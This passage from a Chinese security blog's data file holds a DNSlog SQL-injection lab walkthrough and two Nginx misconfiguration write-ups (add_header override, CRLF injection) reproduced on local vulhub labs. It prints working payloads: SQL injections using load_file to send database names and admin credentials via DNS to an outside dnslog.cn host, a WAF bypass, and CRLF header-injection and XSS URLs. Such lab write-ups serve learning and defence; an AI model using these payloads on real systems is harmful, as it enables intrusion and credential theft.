href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h3><p>我们要做一名合法的白帽子！<br><img src=\"/images/pasted-41.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-42.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-43.png\" alt=\"upload successful\"></p>\n<h3 id=\"dns注入使用前提\"><a href=\"#dns注入使用前提\" class=\"headerlink\" title=\"dns注入使用前提\"></a>dns注入使用前提</h3><p>1.数据库为Mysql<br>2.在mysql.ini配置文件里面需要有一句：secure_file_priv=<br>3.注入需要使用load_file()函数，通过该函数可以读取本地文件里面的字符串内容，当然也可以访问UNC路径的内容。</p>\n<h3 id=\"Dnslog-注入具体流程\"><a href=\"#Dnslog-注入具体流程\" class=\"headerlink\" title=\"Dnslog 注入具体流程\"></a>Dnslog 注入具体流程</h3><p>1.首先打开靶场</p>\n<p><img src=\"/images/pasted-78.png\" alt=\"upload successful\"></p>\n<p>2.通过源码发现，这里需要get传参一个id，尝试一下，页面没什么变化</p>\n<p><img src=\"/images/pasted-79.png\" alt=\"upload successful\"></p>\n<p>3.那就常规思路进行尝试，先加个单引号，页面报错了，说明存在sql注入</p>\n<p><img src=\"/images/pasted-80.png\" alt=\"upload successful\"></p>\n<p>4.闭合之后想要order by 猜当期字段数的，发现有安全狗</p>\n<p><img src=\"/images/pasted-81.png\" alt=\"upload successful\"></p>\n<p>5.Apache中间件有一个特性，从右到左解析，遇到不认识的后缀就往前面解析，这里通过安全狗对后缀的局限性成功绕过（txt文件后缀传参不检测）</p>\n<p><img src=\"/images/pasted-82.png\" alt=\"upload successful\"></p>\n<p>6.通过sleep()函数发现可以执行，页面延迟了，不需要单引号闭合</p>\n<p><img src=\"/images/pasted-83.png\" alt=\"upload successful\"></p>\n<p>7.也就是这里可以通过延时盲注获取数据了，不过太麻烦了，我们使用新方法，通过dnslog获取数据库库名，首先申请一个域名<br>(网址为<a href=\"http://dnslog.cn/\">http://dnslog.cn/</a>    ，这里一般我们是需要有自己的dns服务器，然后让数据库访问我们的服务器进行dns解析的，但是搭建自己的服务器实在太麻烦了，于是就有先人搭建了服务器dnslog，我们可以先点击<strong>Get SubDomain</strong>申请一个域名，然后点击<strong>Refresh Record</strong>获取日志信息)</p>\n<p><img src=\"/images/pasted-84.png\" alt=\"upload successful\"></p>\n<p>8.前面知道了函数load_file()，我们可以通过访问（子查询）+dns获取的域名+目录名，使得数据库访问网络路径并解析dns，将数据放到我们的dnslog中，这里我这样构造payload获取数据库库名。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 or load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-87.png\" alt=\"upload successful\"></p>\n<p>9.回到dnslog的页面访问日志看到库名为mangzhu</p>\n<p><img src=\"/images/pasted-88.png\" alt=\"upload successful\"></p>\n<p>10.接下来就是替换子查询里面的内容获取其他数据了，这里我就获取数据库第一个表的表名为admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 or load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-89.png\" alt=\"upload successful\"></p>\n<p>11.第二个表名为news</p>\n<p><img src=\"/images/pasted-90.png\" alt=\"upload successful\"></p>\n<p>12.接下来获取admin表的字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 or load_file(concat(&#x27;//&#x27;,(select column_name from information_schema.columns where table_name=&#x27;admin&#x27; limit 0,1),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n<p>可以看到有username，password<br><img src=\"/images/pasted-91.png\" alt=\"upload successful\"></p>\n<p>13.一般我们就是获取里面的username和password字段的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 or load_file(concat(&#x27;//&#x27;,(select username from admin where Id=1),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-92.png\" alt=\"upload successful\"></p>\n<p>14.第一个username值为flag，那就获取对应的第一个password的值，得到flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 or load_file(concat(&#x27;//&#x27;,(select password from admin where Id=1),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-93.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-94.png\" alt=\"upload successful\"></p>\n<p>15.提交flag，成功通关！</p>\n<p><img src=\"/images/pasted-95.png\" alt=\"upload successful\"></p>\n"},{"title":"Nginx中间件漏洞之add_header被覆盖","categoryries":"web安全","keywords":"web安全,Nginx,中间件漏洞","description":"Nginx中间件漏洞之add_header被覆盖","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631","date":"2021-08-07T01:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 复现环境\n\n本地搭建docker+vulhub\n```shell\ncd vulhub-master \ncd nginx/insecure-configuration \ndocker-compose up -d\n```\n访问[http://127.0.0.1:8082/](http://127.0.0.1:8082/)显示如下界面即搭建成功\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626765408455-657778d3-0c6a-4334-b7fc-4997dc0ddbb8.png#align=left&display=inline&height=337&margin=%5Bobject%2Object%5D&name=image.png&originHeight=674&originWidth=1478&size=88008&status=done&style=none&width=739)\n\n# 0x02 漏洞复现\n首先访问/test1，这里发现设置了Content-Security-Policy\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766283341-d1e4fb11-642c-4fbb-91d4-92ff04c4c833.png#align=left&display=inline&height=459&margin=%5Bobject%2Object%5D&name=image.png&originHeight=918&originWidth=1820&size=213630&status=done&style=none&width=910)\n访问/test2，Content-Security-Policy被X-Content-Type-Options: nosniff替换了，即安全配置失效。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766358395-e1afd4f5-f850-4c6b-9e2f-a332224d77f2.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1800&size=209111&status=done&style=none&width=900)\n这种情况网上说是可以导致XSS漏洞的，我这里失败了，具体图片如下：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766461360-0db2ae04-19ef-4307-a494-f1d1f8856075.png#align=left&display=inline&height=303&margin=%5Bobject%2Object%5D&name=image.png&originHeight=606&originWidth=1996&size=101702&status=done&style=none&width=998)\n\n\n# 0x03 漏洞分析\n先看具体配置情况：\n```nginx\nadd_header Content-Security-Policy \"default-src 'self'\"; //CSP安全头部\nadd_header X-Frame-Options DENY;\n\nlocation = /test1 {\n    rewrite ^(.*)$ /xss.html break;\n} \n\nlocation = /test2 {\n    add_header X-Content-Type-Options nosniff;\n    rewrite ^(.*)$ /xss.html break;\n}\n```\n首先可以看到在全局设置了CSP安全头部\n接下来看到在/test2配置了一个**X-Content-Type-Options nosniff;**\n\n\n这里因为子块配置了**X-Content-Type-Options**，所以父块的配置失效，所以存在漏洞。\n","source":"_posts/Nginx中间件漏洞之add_header被覆盖.md","raw":"---\ntitle: Nginx中间件漏洞之add_header被覆盖\ntags: \n  - Nginx\n  - 中间件漏洞\n  - web安全\ncategoryries: web安全\nkeywords: 'web安全,Nginx,中间件漏洞'\ndescription: Nginx中间件漏洞之add_header被覆盖\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631\ndate: 2021-08-07 09:45:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 复现环境\n\n本地搭建docker+vulhub\n```shell\ncd vulhub-master \ncd nginx/insecure-configuration \ndocker-compose up -d\n```\n访问[http://127.0.0.1:8082/](http://127.0.0.1:8082/)显示如下界面即搭建成功\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626765408455-657778d3-0c6a-4334-b7fc-4997dc0ddbb8.png#align=left&display=inline&height=337&margin=%5Bobject%2Object%5D&name=image.png&originHeight=674&originWidth=1478&size=88008&status=done&style=none&width=739)\n\n# 0x02 漏洞复现\n首先访问/test1，这里发现设置了Content-Security-Policy\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766283341-d1e4fb11-642c-4fbb-91d4-92ff04c4c833.png#align=left&display=inline&height=459&margin=%5Bobject%2Object%5D&name=image.png&originHeight=918&originWidth=1820&size=213630&status=done&style=none&width=910)\n访问/test2，Content-Security-Policy被X-Content-Type-Options: nosniff替换了，即安全配置失效。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766358395-e1afd4f5-f850-4c6b-9e2f-a332224d77f2.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1800&size=209111&status=done&style=none&width=900)\n这种情况网上说是可以导致XSS漏洞的，我这里失败了，具体图片如下：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766461360-0db2ae04-19ef-4307-a494-f1d1f8856075.png#align=left&display=inline&height=303&margin=%5Bobject%2Object%5D&name=image.png&originHeight=606&originWidth=1996&size=101702&status=done&style=none&width=998)\n\n\n# 0x03 漏洞分析\n先看具体配置情况：\n```nginx\nadd_header Content-Security-Policy \"default-src 'self'\"; //CSP安全头部\nadd_header X-Frame-Options DENY;\n\nlocation = /test1 {\n    rewrite ^(.*)$ /xss.html break;\n} \n\nlocation = /test2 {\n    add_header X-Content-Type-Options nosniff;\n    rewrite ^(.*)$ /xss.html break;\n}\n```\n首先可以看到在全局设置了CSP安全头部\n接下来看到在/test2配置了一个**X-Content-Type-Options nosniff;**\n\n\n这里因为子块配置了**X-Content-Type-Options**，所以父块的配置失效，所以存在漏洞。\n","slug":"Nginx中间件漏洞之add_header被覆盖","published":1,"updated":"2021-08-07T15:24:02.458Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpf10007vkq35lny0nss","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-复现环境\"><a href=\"#0x01-复现环境\" class=\"headerlink\" title=\"0x01 复现环境\"></a>0x01 复现环境</h1><p>本地搭建docker+vulhub</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd vulhub-master </span><br><span class=\"line\">cd nginx/insecure-configuration </span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>访问<a href=\"http://127.0.0.1:8082/\">http://127.0.0.1:8082/</a>显示如下界面即搭建成功<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626765408455-657778d3-0c6a-4334-b7fc-4997dc0ddbb8.png#align=left&display=inline&height=337&margin=%5Bobject%2Object%5D&name=image.png&originHeight=674&originWidth=1478&size=88008&status=done&style=none&width=739\" alt=\"image.png\"></p>\n<h1 id=\"0x02-漏洞复现\"><a href=\"#0x02-漏洞复现\" class=\"headerlink\" title=\"0x02 漏洞复现\"></a>0x02 漏洞复现</h1><p>首先访问/test1，这里发现设置了Content-Security-Policy<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766283341-d1e4fb11-642c-4fbb-91d4-92ff04c4c833.png#align=left&display=inline&height=459&margin=%5Bobject%2Object%5D&name=image.png&originHeight=918&originWidth=1820&size=213630&status=done&style=none&width=910\" alt=\"image.png\"><br>访问/test2，Content-Security-Policy被X-Content-Type-Options: nosniff替换了，即安全配置失效。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766358395-e1afd4f5-f850-4c6b-9e2f-a332224d77f2.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1800&size=209111&status=done&style=none&width=900\" alt=\"image.png\"><br>这种情况网上说是可以导致XSS漏洞的，我这里失败了，具体图片如下：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766461360-0db2ae04-19ef-4307-a494-f1d1f8856075.png#align=left&display=inline&height=303&margin=%5Bobject%2Object%5D&name=image.png&originHeight=606&originWidth=1996&size=101702&status=done&style=none&width=998\" alt=\"image.png\"></p>\n<h1 id=\"0x03-漏洞分析\"><a href=\"#0x03-漏洞分析\" class=\"headerlink\" title=\"0x03 漏洞分析\"></a>0x03 漏洞分析</h1><p>先看具体配置情况：</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">add_header</span> Content-Security-Policy <span class=\"string\">&quot;default-src &#x27;self&#x27;&quot;</span>; //CSP安全头部</span><br><span class=\"line\"><span class=\"attribute\">add_header</span> X-Frame-Options DENY;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">location</span> = /test1 &#123;</span><br><span class=\"line\">    <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^(.*)$</span> /xss.html <span class=\"literal\">break</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">location</span> = /test2 &#123;</span><br><span class=\"line\">    <span class=\"attribute\">add_header</span> X-Content-Type-Options nosniff;</span><br><span class=\"line\">    <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^(.*)$</span> /xss.html <span class=\"literal\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先可以看到在全局设置了CSP安全头部<br>接下来看到在/test2配置了一个<strong>X-Content-Type-Options nosniff;</strong></p>\n<p>这里因为子块配置了<strong>X-Content-Type-Options</strong>，所以父块的配置失效，所以存在漏洞。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-复现环境\"><a href=\"#0x01-复现环境\" class=\"headerlink\" title=\"0x01 复现环境\"></a>0x01 复现环境</h1><p>本地搭建docker+vulhub</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd vulhub-master </span><br><span class=\"line\">cd nginx/insecure-configuration </span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>访问<a href=\"http://127.0.0.1:8082/\">http://127.0.0.1:8082/</a>显示如下界面即搭建成功<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626765408455-657778d3-0c6a-4334-b7fc-4997dc0ddbb8.png#align=left&display=inline&height=337&margin=%5Bobject%2Object%5D&name=image.png&originHeight=674&originWidth=1478&size=88008&status=done&style=none&width=739\" alt=\"image.png\"></p>\n<h1 id=\"0x02-漏洞复现\"><a href=\"#0x02-漏洞复现\" class=\"headerlink\" title=\"0x02 漏洞复现\"></a>0x02 漏洞复现</h1><p>首先访问/test1，这里发现设置了Content-Security-Policy<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766283341-d1e4fb11-642c-4fbb-91d4-92ff04c4c833.png#align=left&display=inline&height=459&margin=%5Bobject%2Object%5D&name=image.png&originHeight=918&originWidth=1820&size=213630&status=done&style=none&width=910\" alt=\"image.png\"><br>访问/test2，Content-Security-Policy被X-Content-Type-Options: nosniff替换了，即安全配置失效。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766358395-e1afd4f5-f850-4c6b-9e2f-a332224d77f2.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1800&size=209111&status=done&style=none&width=900\" alt=\"image.png\"><br>这种情况网上说是可以导致XSS漏洞的，我这里失败了，具体图片如下：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626766461360-0db2ae04-19ef-4307-a494-f1d1f8856075.png#align=left&display=inline&height=303&margin=%5Bobject%2Object%5D&name=image.png&originHeight=606&originWidth=1996&size=101702&status=done&style=none&width=998\" alt=\"image.png\"></p>\n<h1 id=\"0x03-漏洞分析\"><a href=\"#0x03-漏洞分析\" class=\"headerlink\" title=\"0x03 漏洞分析\"></a>0x03 漏洞分析</h1><p>先看具体配置情况：</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">add_header</span> Content-Security-Policy <span class=\"string\">&quot;default-src &#x27;self&#x27;&quot;</span>; //CSP安全头部</span><br><span class=\"line\"><span class=\"attribute\">add_header</span> X-Frame-Options DENY;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">location</span> = /test1 &#123;</span><br><span class=\"line\">    <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^(.*)$</span> /xss.html <span class=\"literal\">break</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">location</span> = /test2 &#123;</span><br><span class=\"line\">    <span class=\"attribute\">add_header</span> X-Content-Type-Options nosniff;</span><br><span class=\"line\">    <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^(.*)$</span> /xss.html <span class=\"literal\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先可以看到在全局设置了CSP安全头部<br>接下来看到在/test2配置了一个<strong>X-Content-Type-Options nosniff;</strong></p>\n<p>这里因为子块配置了<strong>X-Content-Type-Options</strong>，所以父块的配置失效，所以存在漏洞。</p>\n"},{"title":"Nginx中间件漏洞之CRLF注入","keywords":"web安全,Nginx,中间件漏洞","description":"Nginx中间件漏洞之CRLF注入","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631","date":"2021-08-05T01:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 复现环境\n\n本地搭建docker+vulhub\n```shell\ncd vulhub-master \ncd nginx/insecure-configuration \ndocker-compose up -d\n```\n\n\n# 0x02 漏洞复现\n8080所在位置为CRLF注入漏洞\n1、修改burp抓取数据包的端口为8089\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763746667-a4af1ae9-7a82-4633-a3ee-b6f720d0c16f.png#align=left&display=inline&height=265&margin=%5Bobject%2Object%5D&name=image.png&originHeight=530&originWidth=2222&size=96535&status=done&style=none&width=1111)\n2、访问[http://127.0.0.1/](https://127.0.0.1/)，页面会强制跳转到https://127.0.0.1，数据包如下\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763827997-81b931c7-332b-473d-9efa-3617874e6fe0.png#align=left&display=inline&height=463&margin=%5Bobject%2Object%5D&name=image.png&originHeight=926&originWidth=1804&size=210325&status=done&style=none&width=902)\n3、注意这里的Location参数值为即将要跳转的路径，下面更换访问路径如下：\n\n```\nhttp://127.0.0.1:8080/%0a%0dSet-Cookie:%20a=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763968311-2d1b4808-365e-4d3d-9562-00482672aa60.png#align=left&display=inline&height=537&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1074&originWidth=1818&size=249528&status=done&style=none&width=909)\n可以看到成功注入了Set-Cookie头，这里成功为攻击者设置了一个cookie，造成了**会话固定**漏洞。\n\n4、CRLF注入当然不仅能造成会话固定，当换行多一个的时候，便能够将内容输入到页面上，这里很明显到一个反射型XSS漏洞，payload如下：\n```\nhttp://127.0.0.1:8080/%0D%0ASet-Cookie:%20ajie123%0d%0a%0d%0a<img src=1 onerror=alert(1)>\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626764298479-7bd1f1a8-6417-45f1-9116-ffc891d50f84.png#align=left&display=inline&height=480&margin=%5Bobject%2Object%5D&name=image.png&originHeight=960&originWidth=1800&size=237321&status=done&style=none&width=900)\n# 0x03 漏洞分析\nCRLF即回车换行，用字节来表示的话是\\r\\n，URL中就是%0D%0A，在http的header头部字段中，每一个参数后会自动跟上一个\\r\\n，也就是说如果没有正确识别我们输入的回车换行字段时，便可以通过回车换行使页面显示我们需要的数据。\n\n即如下情况:\n正常的返回包\n```http\nHTTP/1.1 302 Moved Temporarily[\\r\\n]\nServer: nginx/1.13.0[\\r\\n]\nDate: Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]\nContent-Type: text/html[\\r\\n]\nContent-Length: 161[\\r\\n]\nConnection: close[\\r\\n]\nLocation: https://127.0.0.1/[\\r\\n]\n```\n设置cookie的返回包：\n```http\nHTTP/1.1 302 Moved Temporarily[\\r\\n]\nServer: nginx/1.13.0[\\r\\n]\nDate: Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]\nContent-Type: text/html[\\r\\n]\nContent-Length: 161[\\r\\n]\nConnection: close[\\r\\n]\nLocation: https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1\n```\n设置xss的返回包：\n```http\nHTTP/1.1 302 Moved Temporarily[\\r\\n]\nServer: nginx/1.13.0[\\r\\n]\nDate: Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]\nContent-Type: text/html[\\r\\n]\nContent-Length: 161[\\r\\n]\nConnection: close[\\r\\n]\nLocation: https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1[\\r\\n][\\r\\n]<img src=1 onerror=alert(1)>\n```\n\n","source":"_posts/Nginx中间件漏洞之CRLF注入.md","raw":"---\ntitle: Nginx中间件漏洞之CRLF注入\ntags: \n  - Nginx\n  - 中间件漏洞\n  - web安全\ncategories: 中间件安全\nkeywords: 'web安全,Nginx,中间件漏洞'\ndescription: Nginx中间件漏洞之CRLF注入\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631\ndate: 2021-08-05 09:45:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 复现环境\n\n本地搭建docker+vulhub\n```shell\ncd vulhub-master \ncd nginx/insecure-configuration \ndocker-compose up -d\n```\n\n\n# 0x02 漏洞复现\n8080所在位置为CRLF注入漏洞\n1、修改burp抓取数据包的端口为8089\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763746667-a4af1ae9-7a82-4633-a3ee-b6f720d0c16f.png#align=left&display=inline&height=265&margin=%5Bobject%2Object%5D&name=image.png&originHeight=530&originWidth=2222&size=96535&status=done&style=none&width=1111)\n2、访问[http://127.0.0.1/](https://127.0.0.1/)，页面会强制跳转到https://127.0.0.1，数据包如下\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763827997-81b931c7-332b-473d-9efa-3617874e6fe0.png#align=left&display=inline&height=463&margin=%5Bobject%2Object%5D&name=image.png&originHeight=926&originWidth=1804&size=210325&status=done&style=none&width=902)\n3、注意这里的Location参数值为即将要跳转的路径，下面更换访问路径如下：\n\n```\nhttp://127.0.0.1:8080/%0a%0dSet-Cookie:%20a=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763968311-2d1b4808-365e-4d3d-9562-00482672aa60.png#align=left&display=inline&height=537&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1074&originWidth=1818&size=249528&status=done&style=none&width=909)\n可以看到成功注入了Set-Cookie头，这里成功为攻击者设置了一个cookie，造成了**会话固定**漏洞。\n\n4、CRLF注入当然不仅能造成会话固定，当换行多一个的时候，便能够将内容输入到页面上，这里很明显到一个反射型XSS漏洞，payload如下：\n```\nhttp://127.0.0.1:8080/%0D%0ASet-Cookie:%20ajie123%0d%0a%0d%0a<img src=1 onerror=alert(1)>\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626764298479-7bd1f1a8-6417-45f1-9116-ffc891d50f84.png#align=left&display=inline&height=480&margin=%5Bobject%2Object%5D&name=image.png&originHeight=960&originWidth=1800&size=237321&status=done&style=none&width=900)\n# 0x03 漏洞分析\nCRLF即回车换行，用字节来表示的话是\\r\\n，URL中就是%0D%0A，在http的header头部字段中，每一个参数后会自动跟上一个\\r\\n，也就是说如果没有正确识别我们输入的回车换行字段时，便可以通过回车换行使页面显示我们需要的数据。\n\n即如下情况:\n正常的返回包\n```http\nHTTP/1.1 302 Moved Temporarily[\\r\\n]\nServer: nginx/1.13.0[\\r\\n]\nDate: Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]\nContent-Type: text/html[\\r\\n]\nContent-Length: 161[\\r\\n]\nConnection: close[\\r\\n]\nLocation: https://127.0.0.1/[\\r\\n]\n```\n设置cookie的返回包：\n```http\nHTTP/1.1 302 Moved Temporarily[\\r\\n]\nServer: nginx/1.13.0[\\r\\n]\nDate: Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]\nContent-Type: text/html[\\r\\n]\nContent-Length: 161[\\r\\n]\nConnection: close[\\r\\n]\nLocation: https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1\n```\n设置xss的返回包：\n```http\nHTTP/1.1 302 Moved Temporarily[\\r\\n]\nServer: nginx/1.13.0[\\r\\n]\nDate: Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]\nContent-Type: text/html[\\r\\n]\nContent-Length: 161[\\r\\n]\nConnection: close[\\r\\n]\nLocation: https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1[\\r\\n][\\r\\n]<img src=1 onerror=alert(1)>\n```\n\n","slug":"Nginx中间件漏洞之CRLF注入","published":1,"updated":"2021-08-07T16:14:41.637Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpf20009vkq315t260uz","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-复现环境\"><a href=\"#0x01-复现环境\" class=\"headerlink\" title=\"0x01 复现环境\"></a>0x01 复现环境</h1><p>本地搭建docker+vulhub</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd vulhub-master </span><br><span class=\"line\">cd nginx/insecure-configuration </span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n\n<h1 id=\"0x02-漏洞复现\"><a href=\"#0x02-漏洞复现\" class=\"headerlink\" 